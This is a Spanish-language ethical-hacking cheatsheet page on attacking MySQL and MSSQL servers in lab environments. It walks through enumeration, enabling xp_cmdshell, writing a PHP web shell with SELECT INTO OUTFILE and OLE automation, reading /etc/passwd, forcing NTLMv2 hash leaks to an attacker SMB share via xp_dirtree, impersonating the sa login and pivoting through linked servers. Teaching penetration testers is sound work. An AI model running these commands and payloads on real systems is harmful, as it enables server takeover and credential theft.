
# Ataques a Bases de Datos

[MySQL](https://www.mysql.com/) y [Microsoft SQL Server](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) son sistemas de administración [de bases de datos relacionales](https://en.wikipedia.org/wiki/Relational_database) que almacenan datos en tablas, columnas y filas. Muchos sistemas de bases de datos relacionales como MSSQL y MySQL utilizan el [Structured Query Language](https://en.wikipedia.org/wiki/SQL) (`SQL`) para consultar y mantener la base de datos.

Los hosts de bases de datos se consideran objetivos importantes, ya que son responsables de almacenar todo tipo de datos confidenciales, incluidos, entre otros, credenciales de usuario, `Personal Identifiable Information (PII)`datos relacionados con el negocio e información de pago. Además, esos servicios suelen estar configurados con usuarios muy privilegiados. Si obtenemos acceso a una base de datos, es posible que podamos aprovechar esos privilegios para realizar más acciones, incluidos movimientos laterales y escalada de privilegios.

***

## <mark style="color:purple;">Enumeración</mark>

De forma predeterminada, MSSQL usa puertos `TCP/1433` y `UDP/1434` y MySQL usa `TCP/3306`. Sin embargo, cuando MSSQL opera en modo "oculto", utiliza el puerto `TCP/2433`. Podemos usar la opción `-sC` de scripts predeterminados de `Nmap` de para enumerar los servicios de bases de datos en un sistema de destino:

### **Banner Grabbing**

```shell-session
afsh4ck@kali$ nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```

El escaneo de Nmap revela información esencial sobre el objetivo, como la versión y el nombre de host, que podemos usar para identificar configuraciones erróneas comunes, ataques específicos o vulnerabilidades conocidas. Exploremos algunas configuraciones erróneas comunes y ataques específicos de protocolo.

***

## <mark style="color:purple;">Mecanismos de autenticación</mark>

`MSSQL` admite dos [modos de autenticación](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server) , lo que significa que los usuarios se pueden crear en Windows o SQL Server:

<table data-header-hidden><thead><tr><th width="197"></th><th></th></tr></thead><tbody><tr><td><strong>tipo de autenticación</strong></td><td><strong>Descripción</strong></td></tr><tr><td><code>Windows authentication mode</code></td><td>Este es el valor predeterminado, a menudo denominado seguridad <code>integrada</code> porque el modelo de seguridad de SQL Server está estrechamente integrado con Windows/Active Directory. Se confía en cuentas específicas de usuarios y grupos de Windows para iniciar sesión en SQL Server. Los usuarios de Windows que ya hayan sido autenticados no necesitan presentar credenciales adicionales.</td></tr><tr><td><code>Mixed mode</code></td><td>El modo mixto admite la autenticación mediante cuentas de Windows/Active Directory y SQL Server. Los pares de nombre de usuario y contraseña se mantienen dentro de SQL Server.</td></tr></tbody></table>

`MySQL` también admite diferentes [métodos de autenticación](https://dev.mysql.com/doc/internals/en/authentication-method.html) , como nombre de usuario y contraseña, así como autenticación de Windows (se requiere un complemento). Además, los administradores pueden [elegir un modo de autenticación](https://docs.microsoft.com/en-us/sql/relational-databases/security/choose-an-authentication-mode) por muchos motivos, incluida la compatibilidad, la seguridad, la usabilidad y más. Sin embargo, dependiendo del método que se implemente, pueden ocurrir errores de configuración.

En el pasado, había una vulnerabilidad [CVE-2012-2122](https://www.trendmicro.com/vinfo/us/threat-encyclopedia/vulnerability/2383/mysql-database-authentication-bypass) en los servidores `MySQL 5.6.x`, entre otras, que nos permitía omitir la autenticación usando repetidamente la misma contraseña incorrecta para la cuenta dada porque la vulnerabilidad `timing attack` existía en la forma en que MySQL manejaba los intentos de autenticación.

En este ataque de sincronización, MySQL intenta repetidamente autenticarse en un servidor y mide el tiempo que tarda el servidor en responder a cada intento. Al medir el tiempo que tarda el servidor en responder, podemos determinar cuándo se ha encontrado la contraseña correcta, incluso si el servidor no indica éxito o fracaso.

En el caso de `MySQL 5.6.x`, el servidor tarda más en responder a una contraseña incorrecta que a una correcta. Así, si intentamos autenticarnos repetidamente con la misma contraseña incorrecta, eventualmente recibiremos una respuesta indicando que se encontró la contraseña correcta, aunque no sea así.

### **Configuraciones erróneas**

La autenticación mal configurada en SQL Server puede permitirnos acceder al servicio sin credenciales si se habilita el acceso anónimo, se configura un usuario sin contraseña o cualquier usuario, grupo o máquina tiene permiso para acceder a SQL Server.

### **Privilegios**

Dependiendo de los privilegios del usuario podremos realizar diferentes acciones dentro de un SQL Server, como por ejemplo:

* Leer o cambiar el contenido de una base de datos.
* Leer o cambiar la configuración del servidor.
* Ejecutar comandos
* Leer archivos locales
* Comunicarse con otras bases de datos.
* Capturar el hash del sistema local
* Suplantar a usuarios existentes
* Obtener acceso a otras redes

En esta sección, exploraremos algunos de estos ataques.

***

## <mark style="color:purple;">Ataques específicos de protocolo</mark>

Es fundamental comprender cómo funciona la sintaxis SQL. Podemos utilizar el módulo gratuito [Fundamentos de inyección SQL](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals) para presentarnos la sintaxis SQL. Aunque este módulo cubre MySQL, la sintaxis de MSSQL y MySQL es bastante similar.

### **Leer/cambiar la base de datos**

Imaginemos que obtuvimos acceso a una base de datos SQL. Primero, necesitamos identificar las bases de datos existentes en el servidor, qué tablas contiene la base de datos y, finalmente, el contenido de cada tabla. Hay que tener en cuenta que podemos encontrarnos con bases de datos con cientos de tablas. Si nuestro objetivo no es sólo obtener acceso a los datos, necesitaremos elegir qué tablas pueden contener información interesante para continuar con nuestros ataques, como nombres de usuario y contraseñas, tokens, configuraciones y más. Veamos cómo podemos hacer esto:

**MySQL: conexión al servidor SQL**

```shell-session
afsh4ck@kali$ mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

**Sqlcmd: conexión al servidor SQL**

Desde Windows:

```powershell
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30
1>
```

{% hint style="info" %}
**Nota**: Cuando nos autenticamos en MSSQL usando `sqlcmd`podemos usar los parámetros `-y`(SQLCMDMAXVARTYPEWIDTH) y `-Y`(SQLCMDMAXFIXEDTYPEWIDTH) para obtener un resultado más atractivo. Tenga en cuenta que puede afectar el rendimiento.
{% endhint %}

### Conexión desde Linux

Si apuntamos a `MSSQL` desde Linux, podemos usar `sqsh` como alternativa a `sqlcmd`:

```shell-session
afsh4ck@kali$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

Alternativamente, podemos utilizar la herramienta de Impacket con el nombre `mssqlclient.py`.

```shell-session
afsh4ck@kali$ mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

{% hint style="info" %}
**Nota**: Cuando nos autenticamos en MSSQL usando `sqsh`podemos usar el parámetro`-h` para deshabilitar encabezados y pies de página para una apariencia más limpia.
{% endhint %}

Cuando utilizamos la autenticación de Windows, debemos especificar el nombre de dominio o el nombre de host de la máquina de destino. Si no especificamos un dominio o nombre de host, asumirá la autenticación SQL y se autenticará con los usuarios creados en SQL Server. En cambio, si definimos el dominio o nombre de host, utilizará la Autenticación de Windows. Si nos dirigimos a una cuenta local, podemos usar `SERVERNAME\\accountname`o `.\\accountname`. El comando completo se vería así:

```shell-session
afsh4ck@kali$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

### **Bases de datos SQL predeterminadas**

Antes de explorar el uso de la sintaxis SQL, es esencial conocer las bases de datos predeterminadas para `MySQL` y `MSSQL`. Esas bases de datos contienen información sobre la base de datos en sí y nos ayudan a enumerar nombres de bases de datos, tablas, columnas, etc. Con acceso a esas bases de datos, podemos usar algunos procedimientos almacenados del sistema, pero generalmente no contienen datos de la empresa.

{% hint style="info" %}
**Nota**: Recibiremos un error si intentamos enumerar o conectarnos a una base de datos para la que no tenemos permisos.
{% endhint %}

#### Schemas/databases predeterminadas en `MySQL` :

* `mysql`- es la base de datos del sistema que contiene tablas que almacenan la información requerida por el servidor MySQL
* `information_schema`- proporciona acceso a los metadatos de la base de datos
* `performance_schema`- es una característica para monitorear la ejecución del servidor MySQL en un nivel bajo
* `sys`- un conjunto de objetos que ayuda a los administradores de bases de datos y a los desarrolladores a interpretar los datos recopilados por el esquema de rendimiento

#### Schemas/databases predeterminadas en `MSSQL` :

* `master`- mantiene la información de una instancia de SQL Server.
* `msdb`- utilizado por el Agente SQL Server.
* `model`- una base de datos modelo copiada para cada nueva base de datos.
* `resource`- una base de datos de solo lectura que mantiene los objetos del sistema visibles en cada base de datos del servidor en el esquema del sistema.
* `tempdb`- mantiene objetos temporales para consultas SQL.

***

## <mark style="color:purple;">**Sintaxis SQL**</mark>

#### **Mostrar bases de datos**

```sql
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```

Si usamos `sqlcmd`, necesitaremos usar `GO` después de nuestra consulta para ejecutar la sintaxis SQL.

```sql
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```

#### **Seleccionar una base de datos**

```sql
mysql> USE htbusers;

Database changed
```

```sql
1> USE htbusers
2> GO

Changed database context to 'htbusers'.
```

**Mostrar tablas**

```sql
mysql> SHOW TABLES;

+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
| permissions                |
| permissions_roles          |
| permissions_users          |
| roles                      |
| roles_users                |
| settings                   |
| users                      |
+----------------------------+
8 rows in set (0.00 sec)
```

#### Seleccionar una tabla

```sql
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles      
roles_users
settings
users 
(8 rows affected)
```

**Seleccionar todos los datos de la tabla "usuarios"**

```sql
mysql> SELECT * FROM users;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

```sql
1> SELECT * FROM users
2> go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)
```

***

## <mark style="color:purple;">Ejecutar comandos</mark>

`Command execution`Es una de las capacidades más deseadas a la hora de atacar servicios comunes porque nos permite controlar el sistema operativo. Si tenemos los privilegios adecuados, podemos utilizar la base de datos SQL para ejecutar comandos del sistema o crear los elementos necesarios para hacerlo.

`MSSQL` tiene un [procedimiento almacenado extendido](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/database-engine-extended-stored-procedures-programming?view=sql-server-ver15) llamado [xp\_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15) que nos permite ejecutar comandos del sistema usando SQL. Tenga en cuenta lo siguiente sobre `xp_cmdshell`:

* `xp_cmdshell`es una característica poderosa y está deshabilitada de forma predeterminada. `xp_cmdshell`se puede habilitar y deshabilitar mediante la [administración basada en políticas](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) o ejecutando [sp\_configure](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option)
* El proceso de Windows generado `xp_cmdshell`tiene los mismos derechos de seguridad que la cuenta de servicio de SQL Server.
* `xp_cmdshell`opera sincrónicamente. El control no se devuelve a la persona que llama hasta que se completa el comando del shell de comandos

Para ejecutar comandos usando la sintaxis SQL en MSSQL, use:

### **XP\_CMDSHELL**

```sql
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

Si `xp_cmdshell` no está habilitado, podemos habilitarlo, si tenemos los privilegios adecuados, usando el siguiente comando:

```sql
-- Para permitir que se cambien las opciones avanzadas. 
EXECUTE sp_configure 'show advanced options', 1
GO

-- Para actualizar el valor configurado actualmente para las opciones avanzadas. 
RECONFIGURE
GO  

-- Para habilitar la función. 
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- Para actualizar el valor configurado actualmente para esta característica.  
RECONFIGURE
GO
```

Existen otros métodos para obtener la ejecución de comandos, como agregar [procedimientos almacenados extendidos](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server) , [ensamblados CLR](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration) , [trabajos del Agente SQL Server](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15) y [scripts externos](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql) . Sin embargo, además de esos métodos, también existen funcionalidades adicionales que se pueden utilizar, como el `xp_regwrite`comando que se utiliza para elevar privilegios mediante la creación de nuevas entradas en el registro de Windows. Sin embargo, esos métodos están fuera del alcance de este módulo.

`MySQL` admite [funciones definidas por el usuario](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) que nos permiten ejecutar código C/C++ como una función dentro de SQL; hay una función definida por el usuario para la ejecución de comandos en este [repositorio de GitHub](https://github.com/mysqludf/lib_mysqludf_sys) . No es común encontrar una función definida por el usuario como esta en un entorno de producción, pero debemos tener en cuenta que es posible que podamos utilizarla.

***

## <mark style="color:purple;">Escribir archivos locales</mark>

`MySQL` no tiene un procedimiento almacenado como `xp_cmdshell`, pero podemos lograr la ejecución de comandos si escribimos en una ubicación en el sistema de archivos que pueda ejecutar nuestros comandos. Por ejemplo, supongamos que `MySQL` opera en un servidor web basado en PHP u otros lenguajes de programación como ASP.NET. Si tenemos los privilegios adecuados, podemos intentar escribir un archivo usando [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) en el directorio del servidor web. Luego podemos buscar la ubicación donde está el archivo y ejecutar nuestros comandos.

**MySQL - Escribir archivo local**

```sql
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

En `MySQL`, una variable global del sistema [Secure\_file\_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limita el efecto de las operaciones de importación y exportación de datos, como las realizadas por las declaraciones `LOAD DATA` y la función [LOAD\_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) . Estas operaciones sólo están permitidas a los usuarios que tienen el privilegio [ARCHIVO](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) .`SELECT … INTO OUTFILE`

`secure_file_priv` se puede establecer de la siguiente manera:

* Si está vacía, la variable no tiene ningún efecto, lo que no es una configuración segura.
* Si se configura con el nombre de un directorio, el servidor limita las operaciones de importación y exportación para que funcionen solo con archivos en ese directorio. El directorio debe existir; el servidor no lo crea.
* Si se establece en NULL, el servidor deshabilita las operaciones de importación y exportación.

En el siguiente ejemplo, podemos ver que la variable `secure_file_priv` está vacía, lo que significa que podemos leer y escribir datos usando `MySQL`:

**MySQL: privilegios de archivos seguros**

```sql
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

Para escribir archivos usando `MSSQL`, necesitamos habilitar [Ole Automation Procedimientos](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option) , que requiere privilegios de administrador, y luego ejecutar algunos procedimientos almacenados para crear el archivo:

**MSSQL: habilitar procedimientos de automatización Ole**

```sql
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

**MSSQL: Crear un archivo**

```sql
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

***

## <mark style="color:purple;">Leer archivos locales</mark>

De forma predeterminada, `MSSQL`permite la lectura de archivos en cualquier archivo del sistema operativo al que la cuenta tenga acceso de lectura. Podemos utilizar la siguiente consulta SQL:

**Leer archivos locales en MSSQL**

```sql
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

Como mencionamos anteriormente, de forma predeterminada una instalación de `MySQL` no permite la lectura de archivos arbitrarios, pero si contamos con la configuración correcta y los privilegios adecuados, podemos leer archivos usando los siguientes métodos:

**MySQL - Leer archivos locales en MySQL**

```sql
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```

***

## <mark style="color:purple;">Capturar hash del servicio MSSQL</mark>

En la sección [`Ataques a SMB`](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/atacando-servicios-comunes/ataques-a-smb.md), discutimos que podríamos crear un servidor SMB falso para robar un hash y abusar de alguna implementación predeterminada dentro de un sistema operativo Windows. También podemos robar el hash de la cuenta de servicio MSSQL utilizando procedimientos almacenados `xp_subdirs` o `xp_dirtree` no documentados, que utilizan el protocolo SMB para recuperar una lista de directorios secundarios en un directorio principal específico del sistema de archivos. Cuando utilizamos uno de estos procedimientos almacenados y lo apuntamos a nuestro servidor SMB, la funcionalidad de escucha del directorio obligará al servidor a autenticarse y enviar el hash NTLMv2 de la cuenta de servicio que ejecuta SQL Server.

Para que esto funcione, primero debemos iniciar [Responder](https://github.com/lgandx/Responder) o [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) y ejecutar una de las siguientes consultas SQL:

**XP\_DIRTREE Robo de hash**

```sql
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

**XP\_SUBDIRS Robo de hash**

```sql
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```

Si la cuenta del servicio tiene acceso a nuestro servidor, obtendremos su hash. Luego podemos intentar descifrar el hash o transmitirlo a otro host.

**XP\_SUBDIRS Robo de hash con Responder**

```shell-session
afsh4ck@kali$ sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
```

**XP\_SUBDIRS Robo de hash con Impacket**

```shell-session
afsh4ck@kali$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed                                                 
[*] Config file parsed                                                 
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F005800320004003400570049004E002D003500440050005A0033005200530032004F00580013456F0051005300470013456F004C004F00430041004C000300140051005300470013456F004C004F00430041004C000500140051005300470013456F004C004F00430041004C0007000800009BFFB9DE3DD80106000400020000000800300030000000000000000100000000200000ADCA14A9054707D3939B6A5F98CE1F6E5981AC62CEC5BEAD4F6200A35E8AD9170A0010000000000000000000000000000000000009001C0063006900660073002F00740065007300740069006E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)                      
[*] Remaining connections []
```

***

## <mark style="color:purple;">Suplantar a usuarios existentes con MSSQL</mark>

SQL Server tiene un permiso especial, llamado `IMPERSONATE`, que permite al usuario ejecutor asumir los permisos de otro usuario o iniciar sesión hasta que se restablezca el contexto o finalice la sesión. Exploremos cómo el privilegio `IMPERSONATE` puede conducir a una escalada de privilegios en SQL Server.

Primero, necesitamos identificar a los usuarios a los que podemos suplantar. Los administradores de sistemas pueden hacerse pasar por cualquier persona de forma predeterminada, pero para los usuarios que no son administradores, los privilegios deben asignarse explícitamente. Podemos utilizar la siguiente consulta para identificar a los usuarios que podemos suplantar:

**Identificar usuarios que podemos suplantar**

```sql
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

Para tener una idea de las posibilidades de escalada de privilegios, verifiquemos si nuestro usuario actual tiene el rol de administrador de sistemas:

**Verificar nuestro usuario y rol actual**

```sql
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

Como indica el valor devuelto `0`, no tenemos el rol de administrador de sistemas, pero podemos suplantar al `sa`usuario. Nos haremos pasar por el usuario y ejecutaremos los mismos comandos. Para suplantar a un usuario, podemos usar la instrucción Transact-SQL `EXECUTE AS LOGIN` y configurarla para el usuario que queremos suplantar.

**Hacerse pasar por el usuario SA (sysadmin)**

```sql
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

{% hint style="warning" %}
**Nota**: Se recomienda ejecutar `EXECUTE AS LOGIN` dentro de la base de datos maestra, porque todos los usuarios, de forma predeterminada, tienen acceso a esa base de datos. Si un usuario al que intenta suplantar no tiene acceso a la base de datos a la que se está conectando, presentará un error. Intente pasar a la base de datos maestra usando `USE master`.
{% endhint %}

Ahora podemos ejecutar cualquier comando como administrador de sistemas como indica el valor devuelto `1`. Para revertir la operación y volver a nuestro usuario anterior, podemos usar la declaración Transact-SQL `REVERT`.

{% hint style="info" %}
Nota: Si encontramos un usuario que no es administrador de sistemas, aún podemos verificar si el usuario tiene acceso a otras bases de datos o servidores vinculados.
{% endhint %}

***

## <mark style="color:purple;">Comunicarse con otras bases de datos con MSSQL</mark>

`MSSQL` tiene una opción de configuración llamada [servidores vinculados](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine) . Los servidores vinculados generalmente se configuran para permitir que el motor de base de datos ejecute una declaración Transact-SQL que incluya tablas en otra instancia de SQL Server u otro producto de base de datos como Oracle.

Si logramos acceder a un SQL Server con un servidor vinculado configurado, es posible que podamos movernos lateralmente a ese servidor de base de datos. Los administradores pueden configurar un servidor vinculado utilizando credenciales del servidor remoto. Si esas credenciales tienen privilegios de administrador de sistemas, es posible que podamos ejecutar comandos en la instancia remota de SQL. Veamos cómo podemos identificar y ejecutar consultas en servidores vinculados.

### **Identificar servidores vinculados en MSSQL**

```sql
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

Como podemos ver en el resultado de la consulta, tenemos el nombre del servidor y la columna `isremote`, donde `1` significa es un servidor remoto y `0` es un servidor vinculado. Podemos ver [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) para más información.

A continuación, podemos intentar identificar el usuario utilizado para la conexión y sus privilegios. La instrucción [EXECUTE](https://docs.microsoft.com/en-us/sql/t-sql/language-elements/execute-transact-sql) se puede utilizar para enviar comandos de transferencia a servidores vinculados. Agregamos nuestro comando entre paréntesis y especificamos el servidor vinculado entre corchetes ( `[ ]`).

```sql
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

{% hint style="info" %}
**Nota**: Si necesitamos usar comillas en nuestra consulta al servidor vinculado, debemos usar comillas dobles simples para escapar de la comilla simple. Para ejecutar varios comandos a la vez podemos dividirlos con un punto y coma (`;`).
{% endhint %}

Como hemos visto, ahora podemos ejecutar consultas con privilegios de administrador de sistemas en el servidor vinculado. Como `sysadmin`, controlamos la instancia de SQL Server. Podemos leer datos de cualquier base de datos o ejecutar comandos del sistema con `xp_cmdshell`. Esta sección cubrió algunas de las formas más comunes de atacar bases de datos SQL Server y MySQL durante las pruebas de penetración. Existen otros métodos para atacar estos tipos de bases de datos, así como otros, como [PostGreSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql) , SQLite, Oracle, [Firebase](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/buckets/firebase-database) y [MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb) , que se tratarán en otros módulos. Vale la pena tomarse un tiempo para leer sobre estas tecnologías de bases de datos y también sobre algunas de las formas comunes de atacarlas.

***

## <mark style="color:purple;">Cheatsheet</mark>

| **Comando**                                                                                                                | **Descripción**                                                                                                       |
| -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| `mysql -u julio -pPassword123 -h 10.129.20.13`                                                                             | Conexión al servidor MySQL                                                                                            |
